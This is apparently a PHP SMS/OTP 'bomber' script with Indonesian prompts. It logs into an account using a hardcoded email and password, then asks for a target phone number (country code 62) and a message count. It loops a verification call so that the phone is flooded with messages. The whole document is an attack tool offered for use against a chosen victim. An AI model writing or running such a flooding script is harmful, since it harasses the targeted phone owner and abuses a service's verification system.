<?php
include 'bommthrml.php';

$init = new Bom();
$init->email = "zumupolij@c1oramn.com";
$init->pass = "Emang enakkk";
$init->Login($init->email,$init->pass);


echo "Nomor Target (pakai 62): ";
$a = trim(fgets(STDIN));
$init->no = "$a";
echo "Jumlah Pesan : ";
$b = trim(fgets(STDIN));
$loop = "$b";
for ($i=0; $i < $loop; $i++) { 
    $init->Verif($init->no);
}
